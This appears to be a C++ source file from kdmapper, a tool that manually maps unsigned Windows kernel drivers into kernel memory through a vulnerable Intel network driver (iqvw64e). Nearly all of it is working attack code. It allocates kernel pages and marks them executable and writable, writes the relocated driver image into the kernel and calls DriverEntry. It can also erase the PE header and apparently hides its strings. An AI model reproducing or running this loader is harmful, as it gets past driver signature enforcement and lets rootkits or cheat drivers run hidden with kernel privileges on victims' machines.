#include "kdmapper.hpp"


uint64_t kdmapper::AllocMdlMemory(HANDLE iqvw64e_device_handle, uint64_t size, uint64_t* mdlPtr) {
	/*added by psec*/
	LARGE_INTEGER LowAddress, HighAddress;
	LowAddress.QuadPart = 0;
	HighAddress.QuadPart = 0xffff'ffff'ffff'ffffULL;

	uint64_t pages = (size / PAGE_SIZE) + 1;
	auto mdl = intel_driver::MmAllocatePagesForMdl(iqvw64e_device_handle, LowAddress, HighAddress, LowAddress, pages * (uint64_t)PAGE_SIZE);
	if (!mdl) {
		printf(_("[-] Can't allocate pages for mdl\n"));
		return { 0 };
	}

	uint32_t byteCount = 0;
	if (!intel_driver::ReadMemory(iqvw64e_device_handle, mdl + 0x028 /*_MDL : byteCount*/, &byteCount, sizeof(uint32_t))) {
		printf(_("[-] Can't read the _MDL : byteCount\n"));
		return { 0 };
	}

	if (byteCount < size) {
		printf(_("[-] Couldn't allocate enough memory, cleaning up\n"));
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	auto mappingStartAddress = intel_driver::MmMapLockedPagesSpecifyCache(iqvw64e_device_handle, mdl, nt::KernelMode, nt::MmCached, NULL, FALSE, nt::NormalPagePriority);
	if (!mappingStartAddress) {
		printf(_("[-] Can't set mdl pages cache, cleaning up.\n"));
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}

	const auto result = intel_driver::MmProtectMdlSystemAddress(iqvw64e_device_handle, mdl, PAGE_EXECUTE_READWRITE);
	if (!result) {
		printf(_("[-] Can't change protection for mdl pages, cleaning up\n"));
		intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, mappingStartAddress, mdl);
		intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdl);
		intel_driver::FreePool(iqvw64e_device_handle, mdl);
		return { 0 };
	}
	printf(_("[+] Allocated pages for mdl\n"));

	if (mdlPtr)
		*mdlPtr = mdl;

	return mappingStartAddress;
}

uint64_t kdmapper::MapDriver(HANDLE iqvw64e_device_handle, BYTE* data, ULONG64 param1, ULONG64 param2, bool free, bool destroyHeader, bool mdlMode, bool PassAllocationAddressAsFirstParam, mapCallback callback, NTSTATUS* exitCode) {

	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);

	if (!nt_headers) {
		printf(_("[-] Invalid format of PE image\n"));
		return 0;
	}

	if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
		printf(_("[-] Image is not 64 bit\n"));
		return 0;
	}

	uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;

	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!local_image_base)
		return 0;

	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
	image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);

	uint64_t kernel_image_base = 0;
	uint64_t mdlptr = 0;
	if (mdlMode) {
		kernel_image_base = AllocMdlMemory(iqvw64e_device_handle, image_size, &mdlptr);
	}
	else {
		kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size);
	}

	UINT64 mp_size = (UINT64)image_size;
	param1 = mdlptr;
	param2 = image_size;

	do {
		if (!kernel_image_base) {
			printf(_("[-] Failed to allocate remote image in kernel\n"));
			break;
		}

		printf(_("[+] Image base has been allocated at -> %p\n"), reinterpret_cast<void*>(kernel_image_base));
		// Copy image headers

		memcpy(local_image_base, data, nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy image sections

		const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);

		for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
			if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
				continue;
			auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);
			memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(data) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
		}

		uint64_t realBase = kernel_image_base;
		if (destroyHeader) {
			kernel_image_base -= TotalVirtualHeaderSize;

			printf(_("[+] Skipped %i bytes of PE Header\n"), TotalVirtualHeaderSize);
		}

		// Resolve relocs and imports

		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);

		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base))) {
			printf(_("[-] Failed to resolve imports\n"));
			kernel_image_base = realBase;
			break;
		}

		// Write fixed image to kernel

		if (!intel_driver::WriteMemory(iqvw64e_device_handle, realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size)) {
			printf(_("[-] Failed to write local image to remote image\n"));
			kernel_image_base = realBase;
			break;
		}

		// Call driver entry point

		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

		printf(_("[<] Calling DriverEntry -> %p\n"), reinterpret_cast<void*>(address_of_entry_point));

		printf("pool base ->%p\n", mdlptr);
		printf("size ->%p\n", mp_size);

		if (callback) {
			if (!callback(&param1, &param1, realBase, image_size, mdlptr)) {
				printf(_("[-] Callback returns false, failed!\n"));
				kernel_image_base = realBase;
				break;
			}
		}

		NTSTATUS status = 0;
		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point, (PassAllocationAddressAsFirstParam ? realBase : param1), param2)) {
			printf(_("[-] Failed to call driver entry\n"));
			kernel_image_base = realBase;
			break;
		}

		if (exitCode)
			*exitCode = status;

		printf(_("[+] DriverEntry returned ->%p\n"), status);

		if (free && mdlMode) {
			intel_driver::MmUnmapLockedPages(iqvw64e_device_handle, realBase, mdlptr);
			intel_driver::MmFreePagesFromMdl(iqvw64e_device_handle, mdlptr);
			intel_driver::FreePool(iqvw64e_device_handle, mdlptr);
		}
		else if (free) {
			intel_driver::FreePool(iqvw64e_device_handle, realBase);
		}


		VirtualFree(local_image_base, 0, MEM_RELEASE);
		return realBase;

	} while (false);


	VirtualFree(local_image_base, 0, MEM_RELEASE);

	intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);

	return 0;
}

void kdmapper::RelocateImageByDelta(portable_executable::vec_relocs relocs, const uint64_t delta) {
	for (const auto& current_reloc : relocs) {
		for (auto i = 0u; i < current_reloc.count; ++i) {
			const uint16_t type = current_reloc.item[i] >> 12;
			const uint16_t offset = current_reloc.item[i] & 0xFFF;

			if (type == IMAGE_REL_BASED_DIR64)
				*reinterpret_cast<uint64_t*>(current_reloc.address + offset) += delta;
		}
	}
}

bool kdmapper::ResolveImports(HANDLE iqvw64e_device_handle, portable_executable::vec_imports imports) {
	for (const auto& current_import : imports) {
		ULONG64 Module = utils::GetKernelModuleAddress(current_import.module_name);
		if (!Module) {
#if !defined(DISABLE_OUTPUT)
			printf(_("[-] Dependency %s wasn't found\n"), current_import.module_name.c_str());
#endif
			return false;
		}

		for (auto& current_function_data : current_import.function_datas) {
			uint64_t function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, Module, current_function_data.name);

			if (!function_address) {
				//Lets try with ntoskrnl
				if (Module != intel_driver::ntoskrnlAddr) {
					function_address = intel_driver::GetKernelModuleExport(iqvw64e_device_handle, intel_driver::ntoskrnlAddr, current_function_data.name);
					if (!function_address) {
#if !defined(DISABLE_OUTPUT)
						printf(_("[-] Failed to resolve import %s ( %s )\n"), current_function_data.name.c_str(), current_import.module_name.c_str());
#endif
						return false;
					}
				}
			}

			*current_function_data.address = function_address;
		}
	}

	return true;
}
